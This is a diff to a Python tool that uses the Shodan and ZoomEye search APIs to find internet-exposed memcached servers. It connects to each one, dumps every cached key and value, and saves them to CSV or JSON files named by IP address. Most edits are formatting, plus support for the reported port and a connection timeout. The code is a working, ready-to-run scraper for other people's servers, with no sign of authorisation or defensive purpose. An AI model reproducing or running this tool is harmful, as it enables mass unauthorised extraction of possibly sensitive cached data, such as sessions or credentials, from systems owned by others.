@@ -43,14 +43,17 @@ def dump_key(key, s):
 def dump_values(keys, s):
     response = make_query("get {}".format(" ".join(keys)), s)
     result = {}
-    for i in range(0, len(response)-1, 2):
-        result[response[i].split(" ")[1]] = response[i+1]
+    for i in range(0, len(response) - 1, 2):
+        result[response[i].split(" ")[1]] = response[i + 1]
     return result
 
 
-def scrape(ip, outdir, as_json):
-    print("[ ] Connecting to {}.".format(ip))
-    s = socket.create_connection((ip, "11211"))
+def scrape(server, outdir, as_json):
+    print("[ ] Connecting to {}:{}.".format(
+        server.get("ip_str"), server.get("port")))
+    s = socket.create_connection(
+        (server.get("ip_str"), server.get("port")), timeout=5)
+    ip = server.get("ip_str")
     key_lengths = get_key_lengths(s)
     print("[ ] Found {} key lengths at {}.".format(len(key_lengths), ip))
     cache = set()
@@ -66,10 +69,10 @@ def scrape(ip, outdir, as_json):
         print("[+] Wrote JSON to {}".format(fname))
     else:
         fname = os.path.join(outdir, "{}.csv".format(ip))
-        with open(fname, "w", newline='') as out_file:
+        with open(fname, "w", newline="") as out_file:
             writer = csv.writer(out_file)
             writer.writerow(["Key", "Value"])
-            for (k,v) in values.items():
+            for (k, v) in values.items():
                 writer.writerow([k, v])
         print("[+] Wrote CSV to {}".format(fname))
 
@@ -78,13 +81,15 @@ def get_servers(api_key):
     api = shodan.Shodan(api_key)
     memcached_servers = []
     try:
-        results = api.search('product:memcached')
-        print('Results found: %s' % results['total'])
-        for result in results['matches']:
-            memcached_servers.append(result['ip_str'])
-            print('[ ] Found memcached server at IP: {}'.format(result['ip_str']))
+        results = api.search("product:memcached")
+        print("Results found: {}".format(results["total"]))
+        for result in results.get("matches"):
+            elem = {"ip_str": result.get("ip_str"), "port": result.get("port")}
+            memcached_servers.append(elem)
+            print("[ ] Found memcached server at IP: {}".format(
+                result["ip_str"]))
     except shodan.APIError as e:
-        print('[-] Shodan error: %s' % e)
+        print("[-] Shodan error: %s" % e)
     return memcached_servers
 
 def zoomeye_login(username, password):
@@ -120,7 +125,6 @@ def get_servers_zoomeye(api_key):
 
     return servers
 
-
 parser = argparse.ArgumentParser(description='Scrape data from memcached servers.')
 parser.add_argument('--key', type=str, help='Shodan API key.')
 parser.add_argument('--email', type=str, help='ZoomEye Email')
@@ -140,4 +144,4 @@ for server in servers:
     try:
         scrape(server, args.out, args.json)
     except Exception as e:
-        print("[-] Error connecting to {}: {}".format(server, e))
+        print("[-] Error connecting to {}: {}".format(server.get("ip_str"), e))
